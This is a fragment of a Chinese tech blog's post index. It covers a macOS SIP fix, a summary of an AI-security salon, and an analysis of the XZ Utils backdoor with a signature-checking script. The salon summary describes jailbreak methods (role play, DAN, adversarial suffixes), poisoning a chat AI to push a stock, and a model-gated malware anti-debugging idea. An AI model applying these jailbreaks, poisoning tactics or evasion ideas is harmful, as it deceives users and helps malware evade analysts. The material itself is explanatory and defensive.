","date":"2024-04-16","objectID":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/:3:0","tags":["问题解决","Docker","Cloud"],"title":"Docker低版本升级","uri":"/posts/docker%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7/"},{"categories":["问题解决"],"content":"MacOS 初识SIP——解决快捷指令sh脚本报错：'Operation not permitted'","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/","tags":["随笔","MacOS","问题解决"],"title":"MacOS初识SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["问题解决"],"content":"前言 因为一些原因，设计了一套快捷指令，中间涉及到一个sh脚本的运行，通过快捷指令运行时就会报错：operation not permitted 奇怪的是在快捷指令窗口下运行一切正常，但是从其他地方直接调用，例如通过Command+Space 打开Spotlight Search下执行就换出现报错。 以测试用快捷指令”Mytest“为例，快捷指令窗口下运行成功截图： 通过Spotlight Search运行Mytest失败截图： 接下去记录下整个排查过程。 省流：解决办法：换个目录，将脚本从系统目录移动到用户目录下。 mv /users/xavier/Downloads/tmp/test.sh /users/xavier/MyScripts/test.sh ​ 文章目的：分享排查思路和过程、介绍SIP ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:1:0","tags":["随笔","MacOS","问题解决"],"title":"MacOS初识SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["问题解决"],"content":"Step 1：初步检查 遇到 “operation not permitted” 错误，这通常意味着系统安全设置或权限设置阻止了脚本的执行。 接下去进行了如下检查： 脚本内容：检查脚本内容，确保脚本中没有尝试执行需要更高权限的操作。没问题。 sh脚本执行权限，chmod 755 test.sh，具有可执行权限。没问题 系统偏好设置：打开“系统偏好设置” \u003e “安全性与隐私” \u003e “隐私”标签页，检查“完全磁盘访问”列表，给快捷指令应用或终端应用（terminal）访问磁盘上文件的权限。 没问题。 Gatekeeper 设置：在“安全性与隐私” \u003e “通用”标签页中，设置允许从“App Store 和被认同的开发者”或“任何来源”安装应用。没问题 管理员权限：尝试以管理员身份运行sh脚本。无影响，还是不行。 在我当前已有认知中所有可能的方法都不能解决问题，那么要尝试定位问题产生的原因。 ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:2:0","tags":["随笔","MacOS","问题解决"],"title":"MacOS初识SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["问题解决"],"content":"Step 2：日志调查 这是一个超出我当前认知的一个问题，需要一步步排查定位问题，目前快捷指令给出的反馈.../test.sh: Operation not permitted太粗糙，需要找更精细的报错日志。 使用MacOS的 控制台应用（Console.app）以获取更多关于错误的详细信息。 又重复执行了一边快捷指令，使用Console.app抓取日志信息，然后通过搜索test.sh定位到详细的日志内容： BackgroundShortcutRunner进程就是快捷指令app，注意到在它上面有一条kernel进程的报错信息，内容如下： System Policy: bash(1538) deny(1) file-read-data /Users/xavier/Downloads/tmp/test.sh 接下去就是搜索该报错信息是什么意思，怎么解决。 ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:3:0","tags":["随笔","MacOS","问题解决"],"title":"MacOS初识SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["问题解决"],"content":"Step 3：定位问题 System Policy: bash(1538) deny(1) file-read-data /Users/xavier/Downloads/tmp/test.sh 通过搜索得知，这个日志信息表明 macOS 的系统策略（很可能是 SIP，即 System Integrity Protection）阻止了 bash 进程（进程ID为1538）读取 /Users/xavier/Downloads/tmp/test.sh 文件数据。 问题就在这个SIP策略。当脚本位于受 SIP 保护的目录中，或者脚本试图执行被 SIP 保护的操作，就可能会遇到权限问题。 这次遇到的情况就是因为我们的脚本被放在了受SIP保护的目录中，因此解决办法非常简单。 在解决问题之前，我想先了解下SIP。 ​ SIP是什么？ SIP ，即系统完整性保护（System Integrity Protection），是 macOS 的一个安全功能，用于保护系统文件和目录，防止这些文件及目录被没有特定权限的进程修改，包括root用户或拥有root权限的用户。 SIP通过一系列内核强制实施的机制来达成这一目标，它限制了关键系统文件的可写性，并对特定关键文件系统位置中的组件进行只读限制。 SIP的保护范围包括多个重要的系统目录和文件，例如/System、/usr、/bin、/sbin以及OSX的预装应用。这些目录和文件在系统启动时会被加载，并且对于保持系统的稳定性和安全性至关重要。SIP确保这些文件和目录不会被恶意代码或其他未经授权的进程修改。 ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:4:0","tags":["随笔","MacOS","问题解决"],"title":"MacOS初识SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["问题解决"],"content":"Step 4：解决问题 之前说了这次遇到的问题就是因为我们的脚本被放在了受SIP保护的目录中，因此解决办法非常简单，只需要将脚本换个位置，放到用户目录下即可，SIP 通常不会阻止读取用户目录下的文件。 移动脚本到用户目录： mv /users/xavier/Downloads/tmp/test.sh /users/xavier/MyScripts/test.sh 当然还有一种办法，就是禁用SIP，但是强烈不推荐，后果自负，我没试过 如果确定需要禁用 SIP 来运行脚本，请小心操作，因为这可能会降低系统的安全性。 在终端运行 sudo csrutil status 检查 SIP 的状态， 使用 sudo csrutil disable ，禁用SIP（需要重启）。 ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:5:0","tags":["随笔","MacOS","问题解决"],"title":"MacOS初识SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["问题解决"],"content":"总结 在排查问题过程中，要尽可能找细节全面的日志信息进行辅助判断。 写程序过程中也要注意报错信息处理，能帮助我们更快定位和解决问题。 （又水一篇文章~ 😆 ） ","date":"2024-04-08","objectID":"/posts/macos-%E5%88%9D%E8%AF%86sip/:6:0","tags":["随笔","MacOS","问题解决"],"title":"MacOS初识SIP","uri":"/posts/macos-%E5%88%9D%E8%AF%86sip/"},{"categories":["职业生涯","议题分享","随笔"],"content":"2024 HackingClub 北京站沙龙，AI+网络安全方向","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":" 2024 HackingClub 北京站 于2024年3月30日 在朝阳酒仙桥789艺术区拽马艺术空间举办。 本次城市沙龙近1000名相关从业者及爱好者报名，到场参与人数400+，现场座无虚席。我去晚了，差点没座。 本期城市沙龙议题方向为AI+网络安全，由HackingClub联合发起人、红客社区负责人TNT主持，特邀致辞嘉宾卜思南，总共有6大议题，演讲嘉宾地图大师 returnwrong、刘泽霖、陈平、刘光明、nEINEI、路建明带来精彩议题分享，助力AI+网络安全发展。 我在本文总结下这次聚会的心得。 议题一：实践挖掘国内AI场景漏洞：科技前沿与安全探索 议题二：基于YOLOV8的恶意软件分类方法研究 议题三：大模型引领网络安全智能化前沿探索 议题四：大模型安全防御与AI网络安全革新研究 议题五：AI双刃剑：实践角度谈AI模型弱点与网络安全应用 议题六：浅谈AI时代企业数据合规视角下的网络安全 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:0:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"1、实践挖掘国内AI场景漏洞 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"议题简介 议题劲爆拉开序幕，首先带来议题的是地图大师returnwrong（DAY1安全团队成员，多家src年榜前十）的实践挖掘国内AI场景漏洞：科技前沿与安全探索 随着AI功能逐步融入网站、App和小程序等应用，白帽黑客如何利用这一技术变革的机遇，更好地挖掘SRC和漏洞众测成为关键。当前国内市场上涌现了众多只需注册即可免费试用的AI产品。这些产品多基于模板程序，支持中文操作。然而，这些AI产品背后的运作机制是怎样的呢？实际上，厂商会预先购买一些国外的AI接口，如ChatGPT4、MidJourney等，然后自行开发前端用户界面。用户输入中文指令后，指令被翻译成英文并传送至AI接口处理，最终结果显示在前端页面上反馈给用户。这背后实则是一场技术“倒卖”游戏。本议题通过三个漏洞挖掘实例，真正以漏洞挖掘者的视角分析了这一过程中存在的问题。 ID：地图大师returnwrong Day1安全团队成员，热爱漏洞挖掘、技术分享： 2023年智联SRC第5 2023年银联SRC第10 2023年知识星球SRC第4 2022年猎聘SRC第8 2022年BOSS直聘SRC第7 随着AI功能逐步融入网站、App和小程序等应用，白帽黑客如何利用这一技术变革的机遇，更好地挖掘SRC和漏洞众测成为关键。 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:1","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"国内AI产品现状简单讲解 目前国内有众多只需注册即可免费试用的AI产品，这些产品大多为基于模板的程序，且完全支持中文操作，但背后的运作机制如何呢？其实厂商会预先购买一些如ChatGPT、MidJourney等国外的AI接口，然后自行开发一套前端用户界面，当用户输入中文指令后，这些指令将被翻译成英文并传送到购买的AI接口进行处理，最后将处理结果呈现在前端页面上反馈给用户。这背后实则是一场技术“倒卖”游戏。 整体流程：用户输入 –\u003e 前台页面 –\u003e 后台翻译 –\u003e 国外接口 –\u003e 文字、视频图像等 –\u003e 前台页面呈现 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:2","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"案例 本议题通过三个漏洞挖掘实例，真正以漏洞挖掘者的视角分析了这一过程中存在的问题。 1 - 生成式图片AI漏洞案例 该案例是绕过了AI的黑名单限制，导致可生成不符合核心价值观的图片。危害在于影响产品口碑，且会被监管单位处罚。 2 - 大语言模型“插件”漏洞案例 记不清了，大概是有个插件功能是检索Github信息并返回，在分享过程中会有超链接，而这个超链接是可以篡改的。 3 - AI投毒案例讲解 该案例是发生在某款边使用边训练的AI上，导致用户输入可被用于训练AI，其他用户在触发攻击者预设的恶意关键词后，会返回攻击者预期的输出。 这里讲的案例场景是，攻击者告诉AI，当别人询问推荐什么股票时，让AI 推荐 14433股票。当受害者在询问AI时触发。 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:1:3","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"2、基于YOLOV8的恶意软件分类方法研究 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:2:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"议题简介 随后是衡水中学高二文科生——刘泽霖（河北衡水中学在读，Hacking Group 0318发起人）带来的基于YOLOv8的恶意软件分类方法研究。 本研究聚焦前沿的YOLOv8深度学习模型，创新性地通过图像化技术将恶意代码转化为RGB图像，构建高效的分类检测系统。通过丰富恶意软件图像特征数据集并优化模型，大幅提升检测准确性和效率。 实验验证与数据分析证实，该方法能有效区分不同恶意软件，并探索了进一步优化可能性。 本研究不仅拓展了YOLOv8在网络安全的应用，也为恶意软件检测与防御提供新思路。 整个议题偏向学术性，有一种看论文的感觉。这个议题让我印象深刻的原因是，恶意软件的图像化，之前没有接触过相关内容。 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:2:1","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"恶意软件图像化技术： 虽然恶意软件持续进化，但将其转换为图像后，视觉方法比传统方法在检测和分类上更有效。这些图形包含关键信息，同家族的恶意软件图像相似，不同家族则有显著差异。由于恶意代码变体通常由自动化技术或重用模块生成，它们在二进制代码中存在共性。研究者们主要采用两种方法研究恶意软件可视化：一是提取图像纹理或结构特征，结合机器学习进行检测和分类；二是使用深度学习自动提取特征，以对抗混淆技术。为获取更多特征，有研究将恶意软件转为彩色图像。还有基于可视化的方法，即使不使用机器学习或深度学习，也能有效地检测恶意软件 大量恶意代码都使用了代码复用技术，因此同类代码通常含有相同的模块，代码存在相似性。而不同类代码存在相异性。图像纹理特征能有效反映这种相似性和差异性。在灰度图中，任何颜色都是由红、绿、蓝三原色以相同的强度组合而成的，这样就形成了从全黑（0灰度等级）到全白（255灰度等级）的256个灰度等级。可执行文件都以二进制形式存储，每8bit数据正好覆盖灰度图每个灰度值，转成方形以后就是灰度图。 ​ 处理流程： 数据转换：将恶意软件二进制数据转换为图像进行提取，有助于识别恶意软件的特征 特征提取：从生成的图像中提取纹理、颜色分布、形状、结构等特征。 分类和检测：使用机器学习或深度学习算法对提取的特征进行分析，识别和分类恶意软件 可视化展示：将分类和检测的结果以可视化的形式展示出来，帮助分析师直观地理解恶意软件的行为和特征。 ​ 二进制文件转为灰度图伪代码： function calculate TextureFeatures(binaryData): grayScalelmage = convertToGrayScale（binaryData） // 将二进制数据转换为灰度图像 textureFeatures = extractTextureFeatures（grayScalelmage） // 提取纹理特征 return textureFeatures function convertToGrayScale(binaryData): // 实现将二进制数据转换为灰度图像的算法 // 每8位数据对应一个灰度值，可以根据灰度等级转换成灰度图像 // 返回灰度图像数据 function extractTextureFeatures(grayScalelmage): // 实现提取纹理特征的算法 // 可以使用各种图像处理技术，如纹理分析、统计特征提取等 // 返回纹理特征向量或描述子 //主程序 binaryData = readBinaryFile（\"executable_file.exe\"）// 读取二进制文件数据 texturefeatures = calculateTextureFeatures（binaryData） // 计算纹理特征 print（textureFeatures） // 打印纹理特征 重新编码二进制数据以形成多通道彩色图像，每3个字节对应于红、绿、蓝三色通道的像素值。重复此过程直到所有数据被使用，不足3字节的末尾数据用0补足。例如，52D586=（R: 82, G: 213, B: 134），AA3033=（R: 170, G: 48, B: 51）。将代码文件转换为一维像素序列后，进行正方化处理，生成彩色图像。图3展示了将可执行文件转换为RGB图像的过程： 图3（a）显示了某恶意代码的可执行文件数据；图3（b）展示了将可执行文件按字节重新编码后的像素序列；图3（c）展示了将像素序列进行正方化后生成的彩色图片。 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:2:2","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"3、大模型引领网络安全智能化前沿探索 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:3:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"议题简介 接下来是陈平（万径安全安全研发工程师）带来的大模型引领网络安全智能化前沿探索 议题围绕实际场景研究大模型在网络安全领域的智能化应用方法及收益，涵盖架构设计、数据治理、知识问答和多智能体联动等方面。 详细介绍知识图谱、提示词压缩等知识注入技术对大模型的赋能和价值，并分享在红蓝对抗、代码生成、安全运营和威胁溯源等场景中，大模型的具体构建过程和应用实践效果。 落地应用工具构建及优化经验分享 主要研究方向：红队工具研发、固件安全、知识图谱构建及应用、人工智能在网络安全领域应用 （POMDP、DRL、LLMs） ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:3:1","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"安全体系智能体构建及应用 这种智能体增加了可解释性，其可解释性是基于知识库检索的。而知识库需要人为构建和维护。 知识图谱构建流程： 设计实体模式 现有安全领域本体归一化处理 隐形知识挖掘、值守优化 构建知识质量评估体系 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:3:2","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"4、大模型安全防御与AI网络安全革新研究 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:4:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"议题简介 之后由刘光明（vivo大模型安全专家）带来大模型安全防御与AI网络安全革新研究 本议题围绕大模型的安全全周期防护展开讨论，分享攻防实践，探讨领先的研究方法和系统化评估方案，以及AI技术在网络安全领域的革新应用。 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:4:1","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"LLM常见的攻击模式 生命周期中对LLM（Large Language Model，大语言模型）的安全威胁： 设计阶段： 模型部署的攻击、训练框架的攻击、训练环境的攻击、供应链的攻击 训练阶段： 训练数据安全、伦理与道德、训练投毒、算力消耗攻击 运行阶段： 提示越狱、指令攻击、角色扮演、模型幻觉 数据收集阶段： 数据投毒、数据后门、伦理与道德、版权侵犯 如图： LLM的两类攻击模式：提示词模式（Prompt-Level）、会话模式（Token-Level） 左边是提示词模式，分别采用了角色扮演（Role Play）攻击，让模型扮演一个邪恶且不守规矩的疯子；恶意诱导（Maliciously Inducing）攻击，诱导模型处于虚拟世界需要完成任务。 右边是会话模式，对抗性后缀（Adversarial suffixes）攻击，添加一些对抗性前后缀，绕过模型规则检测。 DAN（Do anything now）攻击 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:4:2","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"5、AI双刃剑：实践角度谈AI模型弱点与网络安全应用 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"议题简介 nEINEI（某大厂AI安全专家、资深安全研究员）带来 AI双刃剑:实践角度谈AI模型弱点与网络安全应用 随着新技术的涌现，必然伴随着新的安全挑战，这是技术发展中不可避免的效应。其中之一便是内在的安全隐患，即新技术本身的脆弱性可能导致系统的不稳定性和安全问题。 本议题深入探讨AI在部署和使用过程中存在的安全弱点问题，同时介绍AI技术在安全检测和防护方面的实践应用思路。 该议题让我印象深刻的一点是，利用AI对抗AI，其中构想了一种反调试思路： 在恶意软件中增加一个模型，当监测到调试环境时，不生成和执行恶意代码；当检测到是预期的受害者目标环境，则生产并执行恶意代码。 这就是利用了AI 运行逻辑的不可预测性，很难找到像之前的普通恶意软件的条件判断语句 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:1","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"背景 AI赋能网络安全具有迫切的现实意义，我们可以探索特定安全常见引入高算力或特定算法，产生前后质变的业务场景。 抉择：占尽先机，在尚未形成AI对抗AI的时代具有主动优势。 在人工智能的全生命周期，各个阶段都有相应的风险。 对于模型文件，安全攻防的落点在于（冒号后面为笔者自行补充，可能有误）： 模型文件的加密强度：加密强度不足可能导致模型文件泄露，从而可能导致被篡改、劫持、二次打包等问题； 模型文件包含的参数信息 针对模型文件的攻击方式：可篡改模型文件，预留后门等； 模型信息的逆向还原：模型在训练过程中会“记忆”训练数据、数据属性、特征等，对模型进行逆向推导训练可导致训练数据泄露； … ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:2","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"展望 AI的一些在攻击领域的应用： 社会工程学：OSINT搜集、AI生成鱼叉邮件、攻击目标选择、聊天机器人… 自动化：AI自适应木马（firstorder）、攻击路径模拟（caldera AI-fuzzing）… 信息窃取：Yahoo NSFW神经网络检测敏感数据、数据传输-AI伪装加密、ML侧信道获取敲键密码… 隐匿：Bypass NIDS、Bypass EDR、Bypass Email Filter… ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:5:3","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"6、浅谈AI时代企业数据合规视角下的网络安全 最后是路建明（某法院原法官，北京恒都律师事务所高级顾问），浅谈AI时代企业数据合规视角下的网络安全 随着AI时代的全面到来，网络安全对国家、企业、个人的重要性愈发显现，在国家立法的日益完善的情况下，每一个从事IT行业的人都需要问自己，网络安全立法到底知多少。同时，现实的警示案例又能给我们哪些启发。 分享了一些违背数据合规的法律案例。 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:6:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["职业生涯","议题分享","随笔"],"content":"其他 这里我想推荐一本书，腾讯安全朱雀实验室的《AI安全：技术与实战》。 这本书介绍了现阶段常见的AI安全知识，比如：对抗样本攻击、数据投毒攻击、模型后门攻击、预训练模型安全、AI数据隐私窃取、AI应用失控风险。 上述知识点，在本次北京站AI议题分享过程中，都有提及，值得一读。 ","date":"2024-04-07","objectID":"/posts/2024-hackingclub-beijing/:7:0","tags":["随笔","career","AI安全"],"title":"2024 HackingClub北京站沙龙分享","uri":"/posts/2024-hackingclub-beijing/"},{"categories":["漏洞分析","职业生涯"],"content":"XZ Utilѕ 工具库 恶意后门植入漏洞 (CVE-2024-3094) ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:1:0","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"漏洞介绍 XZ是类Unix操作系统上的一种高压缩比的无损数据压缩格式，由 Tukaani 项目开发，通常与gzibzip2 等其他常见数据压缩格式进行比较，它帮助将大文件格式压缩（然后解压缩） 为更小 更易管理的大小， 以便通过文件传输进行共享。 XZ Utils是一个命令行工具，包含XZ文件和liblzma的压缩和解压缩功能。 liblzma 是一个用于处理 XZ 压缩格式的开源软件库，是一种用于数据压缩的类似zlib的API，并且还支持旧版 .lzma 格式。 3月29日，有开发人员在安全邮件列表上发帖称，他在调查SSH性能问题时发现了涉及XZ包中的供应链攻击，进一步溯源发现SSH使用的上游liblzma库被植入了后门代码，恶意代码可能允许攻击者通过后门版本的SSH非授权获取系统的访问权限。恶意代码修改了liblzma代码中的函数，该代码是XZ Utils软件包的一部分，链接到 XZ 库的任何软件都可以使用此修改后的代码，并允许拦截和修改与该库一起使用的数据。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:0","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"漏洞信息 —— —— —— —— 漏洞名称 XZ Utilѕ工具库恶意后门植入漏洞 公开时间 2024-03-29 CVE编号 CVE-2024-3094 漏洞评级 高危 事件类型 供应链攻击、 后门 技术类型 内嵌恶意代码 厂商 开源项目 Tukaani Project 产品 xz 威胁状态 POC/EXP已公开，在野利用已发现，技术细节部分公开 影响版本 xz == 5.6.0 、xz == 5.6.1 、liblzma== 5.6.0 、liblzma== 5.6.1 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:1","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"受影响组件和系统 xz 和 liblzma 5.6.0~5.6.1 版本，可能包括的发行版 / 包管理系统有： Fedora 41 / Fedora Rawhide Debian Sid 非稳定的测试版 5.5.1alpha-0.1 到 5.6.1-1 Alpine Edge x64 架构的 homebrew 滚动更新的发行版，包括 Arch Linux / OpenSUSE Tumbleweed 详情可参考： https://repology.org/project/xz/versions 以下为正在更新的操作系统和发行版列表， 它们已经报告是否受到这个漏洞的影响。 查看受影响的开源操作系统可参考： https://repology.org/project/xz/versions 如果您的系统使用 systemd 启动 OpenSSH 服务器，您的 SSH 认证过程可能被攻击。 非 x64 (amd64) 架构的系统不受影响。 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:2","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"漏洞排查 通过如下命令查看系统本地是否安装了受影响的 XZ： $ xz --version xz (XZ Utils) 5.6.1 liblzma 5.6.1 自查脚本如下： 在系统中执行脚本 #! /bin/bash set -eu # find path to liblzma used by sshd path=\"$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]*')\" # does it even exist? if [ \"$path\" == \"\" ] then echo probably not vulnerable exit fi # check for function signature if hexdump -ve '1/1 \"%.2x\"' \"$path\" | grep -q f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410 then echo probably vulnerable else echo probably not vulnerable fi ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:3","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"缓解措施 目前官方尚无最新版本， 需对软件版本进行降级 5.4.X， 请关注官方新版本发布并及时更新。 Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考： https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266 ","date":"2024-04-06","objectID":"/posts/xz-backdoor-analysis/:2:4","tags":["漏洞分析"],"title":"XZ Utils Backdoor 事件分析汇总","uri":"/posts/xz-backdoor-analysis/"},{"categories":["漏洞分析","职业生涯"],"content":"背后故事 故事大概是： OpenSSH依赖一个名为liblzma(xz)的小众开源压缩库，攻击者虚构了一个名为\"Jia Tan\"的开发者身份，从2021年10月开始为xz项目积极做开发维护贡献，逐渐获得信任。 最终接管了维护工作后，在构建脚本中逐步加入一个复杂隐蔽并复杂混淆的后门，而且是几个月内慢慢的添加所有组件，组合成了完整的后门，接着还联系Linux发行版维护人员，试图让带后门的xz库被打包分发给所有用户，直到微软员工Andres Freund因调查SSH延迟问题发现了此事。 发现也很巧合，Andres Freund在分析一台运行Debian Sid的Linux设备SSH登录速度过慢问题时（有500毫秒的延迟和大量的CPU消耗问题，而且他在使用“Valgrind”工具进行分析和内存调试时遇到了许多报错，也促使他有进一步调查的想法），最终发现了该后门。而且RCE也非常巧妙，将有效负载隐藏到将要发送到 SSH 的专门制作的密钥里。 目前迹象表明，后门作者有选择性的针对 linux 发行版下手。但这个 liblzma 可不只Linux上用。比如目前流行的iOS越狱环境，大部分 tweak 包还是以 .deb 格式发行，比较新的版本就用到了 lzma 作为压缩。 除此之外近期有在 macOS 上使用 brew 安装过 xz 这个包应该也受影响，很多 brew 包都依赖了 xz，你可能不知不觉就装上了，还好暂时不能证明这个后门会感染 macOS。 Andres 的电子邮件里有对整个故事精彩描述。还有有趣的部分是带有混淆后门的二进制文件本身，邮件原文在这。 从5.6.0版本开始，在xz的上游tarball包中发现了恶意代码。通过一系列复杂的混淆手段，liblzma的构建过程从伪装成测试文件的源代码中提取出预构建的目标文件，然后用它来修改liblzma代码中的特定函数。这导致生成了一个被修改过的liblzma库，任何链接此库的软件都可能使用它，从而拦截并修改与此库的数据交互。 xz 5.6.0和5.6.1版本库中存在的恶意注入只包含在tarball下载包中。Git发行版中缺少触发恶意代码构建的M4宏。注入期间构建时使用的第二阶段工件存在于Git存储库中，以防存在恶意的M4宏。如果不合并到构建中，第二阶段文件是无害的。 在发现者的演示中，发现它干扰了OpenSSH守护进程。虽然OpenSSH没有直接链接到liblzma库，但它以一种使其暴露于恶意软件的方式与systemd通信，因为systemd链接到了liblzma。 恶意构建会通过systemd干扰sshd的认证。SSH是一种常用的协议，用于远程连接系统，而sshd是允许访问的服务。在适当的情况下，这种干扰有可能使恶意行为体破坏sshd认证，并远程未经授权访问整个系统。 整个后门故事非常精彩，攻击者为此整整潜伏了三年，只差一点点就可以往众多 Linux发行版的 sshd 注入后门，可用于绕过密钥验证，后果不堪设想。 省流概括: 攻击者 JiaT75 (Jia Tan) 于2021年注册了 GitHub 账号，之后积极参与xz项目的维护，并逐渐获取信任，于2022年成为了xz的定期贡献者，获得了直接 commit 代码的权利。2023年1月7日JiaT75合并了他们的第一次提交。2024年项目URL变更为http://xz.tukaani.org/xz-utils/，进一步增加了JiaT75对该项目的控制。 JiaT75 在最近几个月的一次 commit 中，悄悄加入了 bad-3-corrupt lzma2.xz 和 good-large compressed.lzma 两个看似无害的测试用二进制数据，然而在编译脚本中，在特定条件下会从这两个文件中读取内容对编译结果进行修改，致使编译结果和公开的源代码不一致。 目前初步的研究显示，注入的代码会使用 glibc 的 IFUNC 去 HookOpensSH的 RSA public decrypt 函数，致使攻击者可以通过构造特定的验证数据绕过 RSA 签名验证。(具体细节还在分析中) 只要是同时使用了 liblzma和 OpenSsH的程序就会受到影响，最直接的目标就是 